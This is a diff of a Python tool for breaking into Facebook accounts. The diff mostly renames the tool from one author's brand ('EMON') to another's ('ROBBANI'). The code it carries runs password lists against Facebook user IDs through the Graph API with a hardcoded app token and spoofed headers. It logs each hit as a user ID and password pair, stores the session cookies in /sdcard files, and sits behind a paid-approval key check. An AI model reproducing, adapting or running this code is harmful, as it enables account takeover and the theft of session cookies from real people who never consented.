@@ -28,7 +28,7 @@ def xox(m):
 def p(x):
     print(x)
 
-folder_path = '/sdcard/𝙀𝙈𝙊𝙉'
+folder_path = '/sdcard/𝙍𝙊𝘽𝘽𝘼𝙉𝙄'
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
@@ -74,16 +74,18 @@ os.system('xdg-open https://www.facebook.com/profile.php?id=100054925285605')
 
 logo=(f"""{A}
 
-{A}:::::::::      :::     :::::::::   ::::::::   ::::::::  
-{G}:+:    :+:   :+: :+:   :+:    :+: :+:    :+: :+:    :+: 
-{A}+:+    +:+  +:+   +:+  +:+    +:+ +:+        +:+    +:+ 
-{G}+#+    +:+ +#++:++#++: +#++:++#:  +#+        +#+    +:+ 
-{A}+#+    +#+ +#+     +#+ +#+    +#+ +#+        +#+    +#+ 
-{G}#+#    #+# #+#     #+# #+#    #+# #+#    #+# #+#    #+# 
-{A}#########  ###     ### ###    ###  ########   ########  \033[0;41m𝙀𝙢𝙤𝙣\033[0;92m
+
+      :::::::::   ::::::::  :::::::::  :::::::::      :::     ::::    ::: ::::::::::: 
+     :+:    :+: :+:    :+: :+:    :+: :+:    :+:   :+: :+:   :+:+:   :+:     :+:      
+    +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+  +:+   +:+  :+:+:+  +:+     +:+       
+   +#++:++#:  +#+    +:+ +#++:++#+  +#++:++#+  +#++:++#++: +#+ +:+ +#+     +#+        
+  +#+    +#+ +#+    +#+ +#+    +#+ +#+    +#+ +#+     +#+ +#+  +#+#+#     +#+         
+ #+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#     #+# #+#   #+#+#     #+#          
+###    ###  ########  #########  #########  ###     ### ###    #### ###########\033[0;41m𝙍𝙊𝘽𝘽𝘼𝙉𝙄\033[0;92m
+
  {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} 𝙀𝙢𝙤𝙣☬
- {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G} 𝙈𝘿 𝙔𝙖𝙨𝙞𝙣 𝘼𝙝𝙢𝙚𝙙 𝙚𝙢𝙤𝙣
+ {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} 𝙍𝙊𝘽𝘽𝘼𝙉𝙄☬
+ {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G} 𝙍𝙊𝘽𝘽𝘼𝙉𝙄 𝙂𝘼𝙈
  {R}❲{G}😻{R}❳{G} 𝙑𝙀𝙍𝙎𝙄𝙊𝙉   {R}:{G}   1.0
  {R}❲{G}💚{R}❳{G} 𝙎𝙏𝘼𝙏𝙐𝙎    {R}:{G} \033[0;41m𝙋𝘼𝙄𝘿\033[0;92m
  {R}❲{G}😻{R}❳{G} 𝙏𝙊𝙊𝙇𝙎     {R}:{G} 𝙍𝙖𝙣𝙙𝙤𝙢+𝙁𝙞𝙡𝙚 𝙘𝙡𝙤𝙣𝙞𝙣𝙜
@@ -95,15 +97,15 @@ def approval():
   uuid = str(os.geteuid())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/Emon1214/Lover/blob/main/Darco.txt').text
+    httpCaht = requests.get('https://github.com/robbani00/robbani').text
     if id in httpCaht:
       print(f"{R}❲{G}1{R}❳{G} SUCCESSFUL APPROVAL")
       msg = str(os.geteuid())
       time.sleep(0.5)
-      Main_𝙀𝙈𝙊𝙉()
+      Main_ROBBANI()
       pass
     else:
-      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} 𝙀𝙈𝙊𝙉=['+id+']=XD')
+      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} ROBBANI=['+id+']=XD')
       linex()
       print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
       linex()
@@ -117,7 +119,7 @@ def approval():
     sys.exit()
 
 
-def Main_𝙀𝙈𝙊𝙉():
+def Main_ROBBANI():
         clear()
         print(f"{R}❲{G}1{R}❳{G} Start File Cloning")
         print(f"{R}❲{G}2{R}❳{G} Start Random Cloning")
@@ -144,7 +146,7 @@ def Main_𝙀𝙈𝙊𝙉():
 ##----------FILE---------##
  
 def file():
-    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}𝙀𝙈𝙊𝙉.txt {R}❲{G}ETC{R}❳{G}");linex()
+    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}𝙍𝙊𝘽𝘽𝘼𝙉𝙄.txt {R}❲{G}ETC{R}❳{G}");linex()
     file = input(f"{R}❲{G}~{R}❳{G} File Name {R}:{G} ")
     try:
         fo = open(file,'r').read().splitlines()
@@ -181,7 +183,7 @@ def file():
     print(f'\r{R}--------------------------------------------------')
     print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
     print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
-    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙀𝙈𝙊𝙉_M1_FILE_OK.txt")
+    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙍𝙊𝘽𝘽𝘼𝙉𝙄_M1_FILE_OK.txt")
     print(f'\r{R}--------------------------------------------------')
     input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
     os.system('python Main_MRM.py')
@@ -214,10 +216,10 @@ def bd():
                 print(f'\r{R}--------------------------------------------------')
                 print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                 print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
-                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙀𝙈𝙊𝙉_M1_FILE_OK.txt")
+                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙍𝙊𝘽𝘽𝘼𝙉𝙄_M1_FILE_OK.txt")
                 print(f'\r{R}--------------------------------------------------')
                 input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
-                os.system('python Main_𝙀𝙈𝙊𝙉.py')
+                os.system('python Main_𝙍𝙊𝘽𝘽𝘼𝙉𝙄.py')
 
 ##--------------INDIA_RANDOM------------##
 
@@ -248,7 +250,7 @@ def ind():
                 print(f'\r{R}--------------------------------------------------')
                 print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                 print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
-                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙀𝙈𝙊𝙉_M1_FILE_OK.txt")
+                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙍𝙊𝘽𝘽𝘼𝙉𝙄_M1_FILE_OK.txt")
                 print(f'\r{R}--------------------------------------------------')
                 input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                 os.system('python Main_MRM.py')
@@ -258,7 +260,7 @@ def ind():
 def gmail():
                 os.system('rm -rf .gm.txt')
                 clear()
-                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} 𝙀𝙈𝙊𝙉');linex()
+                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} 𝙍𝙊𝘽𝘽𝘼𝙉𝙄');linex()
                 first = input(f'{R}❲{G}~{R}❳{G} First Name {R}:{G} ')
                 clear()
                 print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} khan {R}|{G} Islam {R}|{G} ali {R}|{G} Ahmed');linex()
@@ -305,7 +307,7 @@ def gmail():
                 print(f'\r{R}--------------------------------------------------')
                 print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                 print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
-                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙀𝙈𝙊𝙉_M1_FILE_OK.txt")
+                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/𝙍𝙊𝘽𝘽𝘼𝙉𝙄_M1_FILE_OK.txt")
                 print(f'\r{R}--------------------------------------------------')
                 input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                 os.system('python Main_MRM.py')
@@ -334,7 +336,7 @@ def Emon(uid,pas):
 def rd1(ids,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write(f'\r{R}❲{G}𝙀𝙈𝙊𝙉🥰-𝐗𝐃{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r{R}❲{G}𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-𝙈𝙍{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         for pas in passlist:
                 accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 head = {'User-Agent':sex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
@@ -347,11 +349,11 @@ def rd1(ids,passlist):
                         cookie = f"sb={ssbb};{ckkk}"
                         status= lock(uid)
                         if "Active" in status:
-                        	print(f'\r{R}❲{G}𝙀𝙈𝙊𝙉🥰-𝐗𝐃_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
+                        	print(f'\r{R}❲{G}𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-𝙈𝙍_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                         	Emon(uid,pas)
                         print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
-                        file_path_ok = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-RANDOM-OK.txt')
-                        file_path_cookies = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-RANDOM-COOKIE.txt')
+                        file_path_ok = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-RANDOM-OK.txt')
+                        file_path_cookies = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-RANDOM-COOKIE.txt')
                         with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
                             file_ok.write(uid+' | '+pas+'\n')
                             file_cookies.write(uid+' | '+pas+' |-----> '+cookie+'\n')
@@ -359,8 +361,8 @@ def rd1(ids,passlist):
                         break
                 elif 'www.facebook.com' in po['error']['message']:
                         uid = str(po['error']['error_data']['uid'])
-                        print(f'\r{R}❲{Y}𝙀𝙈𝙊𝙉🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
-                        file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-RANDOM-CP.txt')
+                        print(f'\r{R}❲{Y}𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
+                        file_path = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-RANDOM-CP.txt')
                         with open(file_path, 'a') as file:
                             file.write(uid+' | '+pas+'\n')
                         cps.append(uid)
@@ -399,7 +401,7 @@ def sex():
 def api1(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write(f'\r{R}❲{G}𝙀𝙈𝙊𝙉-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r{R}❲{G}𝙍𝙊𝘽𝘽𝘼𝙉𝙄-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -416,19 +418,19 @@ def api1(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print(f'\r{R}❲{G} I𝙀𝙈𝙊𝙉🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
+                    print(f'\r{R}❲{G} I𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                     Emon(uid,pas)
                     print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
-                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M1-OK.txt')
-                    open('/sdcard/XD/𝙀𝙈𝙊𝙉-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
+                    file_path = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-FILE-M1-OK.txt')
+                    open('/sdcard/XD/𝙍𝙊𝘽𝘽𝘼𝙉𝙄-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+' | '+pas+'\n')
                     oks.append(uid)
                     break
             elif 'www.facebook.com' in po['error']['message']:
                     uid = str(po['error']['error_data']['uid'])
-                    print(f'\r{R}❲{Y}𝙀𝙈𝙊𝙉🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
-                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M1-CP.txt')
+                    print(f'\r{R}❲{Y}𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
+                    file_path = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-FILE-M1-CP.txt')
                     with open(file_path, 'a') as file:
                         file.write(uid+' | '+pas+'\n')
                     cps.append(uid)
@@ -445,7 +447,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write(f'\r{R}❲{G}𝙀𝙈𝙊𝙉-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r{R}❲{G}𝙍𝙊𝘽𝘽𝘼𝙉𝙄-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -462,19 +464,19 @@ def api2(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print(f'\r{R}❲{G}𝙀𝙈𝙊𝙉🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
+                    print(f'\r{R}❲{G}𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                     Emon(uid,pas)
                     print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
-                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M2-OK.txt')
-                    open('/sdcard/XD/𝙀𝙈𝙊𝙉-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
+                    file_path = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-FILE-M2-OK.txt')
+                    open('/sdcard/XD/𝙍𝙊𝘽𝘽𝘼𝙉𝙄-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+' | '+pas+'\n')
                     oks.append(uid)
                     break
             elif 'www.facebook.com' in po['error']['message']:
                     uid = str(po['error']['error_data']['uid'])
-                    print(f'\r{R}❲{Y}𝙀𝙈𝙊𝙉🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
-                    file_path = os.path.join(folder_path, '𝙀𝙈𝙊𝙉-FILE-M2-CP.txt')
+                    print(f'\r{R}❲{Y}𝙍𝙊𝘽𝘽𝘼𝙉𝙄🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
+                    file_path = os.path.join(folder_path, '𝙍𝙊𝘽𝘽𝘼𝙉𝙄-FILE-M2-CP.txt')
                     with open(file_path, 'a') as file:
                         file.write(uid+' | '+pas+'\n')
                     cps.append(uid)
@@ -489,7 +491,7 @@ def api2(ids,names,passlist):
 
 ##------------END-------------##
 
-try:Main_𝙀𝙈𝙊𝙉()
+try:Main_𝙍𝙊𝘽𝘽𝘼𝙉𝙄()
 except requests.exceptions.ConnectionError:
     print(f'\n\033[1;92m [×] \033[1;91mNo internet connection ...')
 except Exception as e:pass
